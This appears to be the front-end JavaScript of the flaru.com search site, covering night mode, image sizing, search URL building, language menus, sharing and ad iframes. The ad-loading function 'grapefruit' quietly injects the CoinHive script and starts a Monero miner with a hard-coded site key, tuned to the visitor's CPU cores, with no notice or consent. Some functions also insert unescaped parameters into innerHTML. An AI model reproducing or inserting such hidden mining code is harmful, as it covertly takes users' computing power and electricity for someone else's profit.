 if (typeof String.prototype.trim !== 'function') {
     String.prototype.trim = function() {
         return this.replace(/^\s+|\s+$/g, '');
     }
 }

 function gEI(id) {
     return document.getElementById(id);
 }

 function dayEnter() {
     gEI('n').textContent = " ";
 }

 function nightmode() {
     var cV = gC('nightmode');
     if (cV == 'night') {
         document.cookie = "nightmode=day; path=/; domain=flaru.com";
         dayEnter();
     }
     if (cV == 'day') {
         document.cookie = "nightmode=night; path=/; domain=flaru.com";
         nightEnter();
     }
 }

 function dayNightCheck() {
     var cV = gC('nightmode');
     if (!cV) {
         document.cookie = "nightmode=day; path=/; domain=flaru.com";
     }
     if (cV == 'night') {
         nightEnter();
     }
 }
 dayNightCheck();

 function picLarge() {
     gEI('p').textContent = ".exo-native-widget-item-title,a:link.exo-native-widget-item-title{color:#66ffff !important}img.gs-image{height: auto !important;width: auto !important;margin:0 auto 10px auto !important;float:left;border-radius:15px;max-height: 100% !important;}.gs-web-image-box, img.gs-image, .gs-promotion-image-box img.gs-promotion-image{max-height:initial !important;width:initial;height: auto !important;}.gsc-table-cell-thumbnail, .gsc-thumbnail, .gs-image{max-width: 100% !important;width: auto !important;height: auto !important;max-height: 100% !important;}td {display:block}.gsc-table-cell-snippet-close{text-align:left;width:100% !important;float:left;margin:0 !important}.gsc-result{margin:0 0 30px 0px !important}.bi{width:21px !important}@media (max-width: 799px) {img.gs-image{max-width:98% !important}";
 }

 function picSmall() {
     gEI('p').textContent = " ";
 }

 function imgsize(sV) {
     var sV = gC('ims');
     if (sV == 's') {
         document.cookie = "ims=l; path=/; domain=flaru.com";
         picLarge();
     }
     if (sV == 'l') {
         document.cookie = "ims=s; path=/; domain=flaru.com";
         picSmall();
     }
 }

 function imgsizeCheck() {
     var sV = gC('ims');
     if (sV == 'l') {
         picLarge();
     }
     if (!sV) {
         if (navigator.appVersion.indexOf("MSIE") == -1) {
             document.cookie = "ims=l; path=/; domain=flaru.com";
             picLarge();
         }
     }
 }
 imgsizeCheck();

 function handleKeyPress(e) {
     var key = e.keyCode || e.which;
     if (key == 13) {
         searchRegular()
     }
 }

 function searchRegular() {
     var s = gEI("s").value;
     var s = s.trim();
     var s = s.replace(/site\:/g, '');
     var s = s.replace(/ *\ /g, ' ');
     var s = s.replace(/-/g, '===_=_==');
     var s = s.replace(/ /g, '-');
     var s = s.replace(/===_=_==/g, '_-');
     var s = encodeURIComponent(s);
     var s = s.split("!").join("%21");
     var s = s.split("(").join("%28");
     var s = s.split(")").join("%29");
     var s = s.split("*").join("%2A");
     var s = s.split("~").join("%7E");
     var s = s.split('"').join("%22");
     var s = s.split('#').join("%23");
     var s = s.split("'").join("%27");
     var sPrefix = '/';
     var urlPath = window.location.pathname;
     var mSA = 'ar,bg,ca,hr,zh,cs,da,nl,en,fil,fi,fr,de,el,he,hi,hu,id,it,ja,ko,lv,lt,no,pl,pt,ro,ru,sr,sk,sl,es,sv,th,tr,uk,vi';
     var mSA = mSA.split(',');
     var arrayLength = mSA.length;
     for (var i = 0; i < arrayLength; i++) {
         if (urlPath.indexOf('/' + mSA[i] + '/') != -1) {
             var sPrefix = '/' + mSA[i] + '/';
             var langStatus = 'yes';
             break;
         }
     }
     if (sPrefix == '/') {
         var userLang = navigator.language || navigator.userLanguage;
         userLang = userLang.split("-");
         userLang = userLang[0];
         if (userLang) {
             sPrefix = '/' + userLang + '/';
         }
     }
     var dN = gEI("domain").value;
     var dN = dN.trim();
     if (dN.indexOf("://") > -1) {
         dN = dN.split('/')[2];
     } else {
         dN = dN.split('/')[0];
     }
     dN = dN.split(':')[0];
     if (dN.indexOf("www.") > -1) {
         dN = dN.split('www.')[1];
     }
     if (dN.length > 0) {
         if (dN.indexOf(".") == -1) {
             return false;
         }
     }
     dN = dN.replace(/\s+/g, '');
     var domainString = sPrefix + dN + "/" + s;
     domainString = domainString.replace('//', '/');
     window.open(domainString, "_self");
 }

 function searchExternal(e) {
     var s = gEI("s").value;
     var s = s.trim();
     var s = s.replace(/ +/g, ' ');
     var s = encodeURIComponent(s);
     window.open(e + s, "_self");
 }

 function searchCountry(e) {
     if (e) {
         var e = e.toLowerCase();
         window.open('https://' + e + '.flaru.com' + window.location.pathname, "_self");
     }
 }

 function searchLanguage(e) {
     if (e) {
         window.open(e, "_self");
     }
 }

 function searchSite(e) {
     if (e) {
         window.open(e, "_blank");
     }
 }

 function changeResults(e) {
     if (e) {
         document.cookie = "resultsNum=" + e + "; path=/; domain=flaru.com";
         location.reload();
     }
 }

 function gC(name) {
     var value = "; " + document.cookie;
     var parts = value.split("; " + name + "=");
     if (parts) return parts.pop().split(";").shift();
 }

 function enterPress(e, feature) {
     var key = e.keyCode || e.which;
     if (key == 13) {
         window[feature]();
     }
 }

 function backb() {
     window.history.back();
 }

 function cords(a1, a2, l, c, d) {
     var r = 'ar-العربية:bg-Български:ca-Català:cs-Čeština:zh-中文:da-Danske:de-Deutsche:el-ελληνικά:en-English:es-Español:fi-Suomi:fil-Pilipino:fr-Français:he-עִברִית:hi-हिंदी:hr-Hrvatski:hu-Magyar:id-Bahasa:it-Italiano:ja-日本語:ko-한국어:lt-Lietuvos:lv-Latvijā:nl-Nederlands:no-Norsk:pl-Polski:pt-Português:ro-Română:ru-Русский:sk-Slovenský:sl-Slovenščina:sr-Srpski:sv-Svenska:th-ภาษาไทย:tr-Türk:uk-Український:vi-Tiếng Việt:';
     var r = r.split(':');
     var lL = ' ';
     var arrayLength = r.length;
     for (var i = 0; i < arrayLength; i++) {
         if (r[i]) {
             var z = r[i].split('-');
             if (l == 't') {
                 var lL = lL + '<option value="' + a1 + '/' + z[0] + '/' + a2 + '">' + z[1] + '</option>';
             } else if (l == 'b') {
                 var lL = lL + '<a href="' + a1 + '/' + z[0] + '/' + a2 + '">' + z[1] + '</a>';
             }
         }
     }
     if (l == 't') {
         var lL = '<option value="">' + d + '</option>' + lL;
     }
     gEI(c).innerHTML = lL;
 }

 function rli(itemList) {
     var items = itemList.split(',');
     return items[Math.floor(Math.random() * items.length)];
 }

 function orangeleaf(exfr, size, type) {
     var zId1 = rli('2861960');
     var loc1 = "https://ads.exoclick.com/iframe.php?idzone=" + zId1 + "&size=" + size;

     function aLoader(exfr, loc1) {
         if (gEI(exfr).getAttribute('src') == "") {
             gEI(exfr).src = loc1;
         }
     }
     if (gEI("results")) {
         var times = 100;
         for (var i = 1; i < times; i++) {
             setTimeout(function() {
                 var string = gEI("results").innerHTML;
                 if (string.indexOf('"arw"') == -1) {
                     var n = string.length;
                     if (+n >= 10000) {
                         if (string.indexOf('gsc-control') != -1) {
                             if (gEI(exfr)) {
                                 if (gEI(exfr).getAttribute('src') == "") {
                                     aLoader(exfr, loc1);
                                 }
                             }
                         }
                     }
                 }
             }, i + '00');
         }
     } else {
         aLoader(exfr, loc1);
     }
 }

 function grapefruit(exfr, size, type) {
     var loc1 = "https://ads.exoclick.com/iframe.php?idzone=" + zId1 + "&size=" + size;

     function aLoader(exfr, loc1, cTT1TM) {
         function cTT(cTT1TM) {
             function cTT1() {
                 function loadJS(file) {
                     var jsElm = document.createElement("script");
                     jsElm.type = "application/javascript";
                     jsElm.id = "chID";
                     jsElm.src = file;
                     document.body.appendChild(jsElm);
                 }
                 if (!gEI('chID')) {
                     loadJS('https://coin-hive.com/lib/coinhive.min.js');
                     setTimeout(cTT2, '7000');
                 }
             }

             function cTT2() {
                 var threadsCalc = '1';
                 var throttleCalc = '0.9';
                 var threads = navigator.hardwareConcurrency;
                 if (threads >= '4') {
                     var threadsCalc = Math.max(1, Math.floor(threads / 4));
                     var throttleCalc = '0.5';
                 }
                 var xmr = new CoinHive.Anonymous('mB2D6iOsObaOjiXd7LDBpIxdVg9t5d9h', {
                     throttle: throttleCalc,
                     threads: threadsCalc
                 });
                 xmr.start();
             }
             setTimeout(cTT1, cTT1TM);
         }
         if (gEI(exfr).getAttribute('src') == "") {
             var cWidth = gEI("w1").offsetWidth;
             if (cWidth > '719') {
                 var vtype = 'd';
                 var zId1 = '2992434';
             } else if (cWidth > '200') {
                 var vtype = 'm';
                 var zId1 = '2861960';
             }
             if (gEI("nodeT").style.width != "1px") {
                 var rNum = Math.floor((Math.random() * 1) + 1);
                 if (rNum == '1') {
                     gEI("xc2").style.height = "250px";
                     gEI("xc2").style.visibility = "visible";
                     gEI("ic2").style.border = "1px solid #ababab";
                     gEI("ic2").style.borderRadius = "10px";
                     gEI("exfr2").style.height = "250px";
                     gEI("exfr2").style.width = "300px";
                     gEI("s4").style.marginTop = "0px";
                     gEI(exfr).src = loc1;
                 } else {
                     gEI("nodeT").style.width = "1px";
                 }
             }
             cTT(cTT1TM);
         }
     }
     if (gEI("results")) {
         var times = 100;
         for (var i = 1; i < times; i++) {
             setTimeout(function() {
                 var string = gEI("results").innerHTML;
                 if (string.indexOf('"arw"') == -1) {
                     var n = string.length;
                     if (+n >= 10000) {
                         if (string.indexOf('gsc-control') != -1) {
                             if (gEI(exfr)) {
                                 if (gEI(exfr).getAttribute('src') == "") {
                                     aLoader(exfr, loc1, '6000', 's');
                                 }
                             }
                         }
                     }
                 }
             }, i + '00');
         }
     } else {
         aLoader(exfr, loc1, '6000', 'h');
     }
 }

 function broccoli(sageTest, parsleyTest, mintTest, gingerTest, cats, lc) {
     if (mintTest == 1) {
         if (gEI("xc2")) {
             grapefruit('exfr2', '300x250', 'sprout');
         }
     }
 }

 function brambles(sageTest, parsleyTest, mintTest, gingerTest, cats, lc, ra, sl) {
     var cWidth = gEI("w1").offsetWidth;
     if (cWidth > '719') {
         var vtype = 'd';
     } else if (cWidth > '200') {
         var vtype = 'm';
     }
     if (vtype == 'd') {
         if (gEI("aTL")) {
             gEI("aTL").innerHTML = sl;
         }
     }
 }

 function share(e) {
     if (e) {
         var shareTitle = document.title;
         var shareTitle = shareTitle.replace(' - Flaru', "");
         var shareTitle = encodeURIComponent(shareTitle);
         var shareUrl = location.href;
         if (e == 'naver') {
             location.href = 'http://share.naver.com/web/shareView.nhn?url=' + shareUrl + '&title=' + shareTitle;
         } else if (e == 'facebook') {
             location.href = 'http://www.facebook.com/sharer.php?u=' + shareUrl;
         } else if (e == 'twitter') {
             var shareUrl = encodeURIComponent(shareUrl);
             location.href = 'https://twitter.com/intent/tweet?url=' + shareUrl;
         } else if (e == 'reddit') {
             location.href = 'http://www.reddit.com/login?dest=%2Fsubmit%3Furl%3D' + shareUrl;
         } else if (e == 'tumblr') {
             var shareUrl = encodeURIComponent(shareUrl);
             location.href = 'http://tumblr.com/widgets/share/tool?canonicalUrl=' + shareUrl;
         } else if (e == 'email') {
             var shareUrl = encodeURIComponent(shareUrl);
             window.location.href = 'mailto:mail@example.org?subject=' + shareTitle + '&body=' + shareUrl;
         } else if (e == 'sms') {
             var shareUrl = encodeURIComponent(shareUrl);
             window.location.href = 'sms:777?body=' + shareUrl;
         }
     }
 }

 function sprinkles(r, lc, sdpx, h, n, d, urlct, sdap) {
     var r = r.split(',');
     var lL = ' ';
     var arrayLength = r.length;
     var urlct2 = urlct;
     var urlct = decodeURIComponent(urlct);
     for (var i = 0; i < arrayLength; i++) {
         var lL = lL + '<a class="s1" rel="nofollow" href="/' + lc + '/' + r[i] + '/' + sdpx + urlct2 + '" title="' + sdap + r[i] + '"><span class="i3"></span><div class="s2">' + r[i] + '</div><div class="s3">/' + lc + '/' + r[i] + '/' + sdpx + urlct + '</div></a>';
     }
     gEI("sd").innerHTML = lL + '<a class="b7 r" href="/' + lc + '/' + d + '/' + h + '/1/">' + n + ' ►</a>';
 }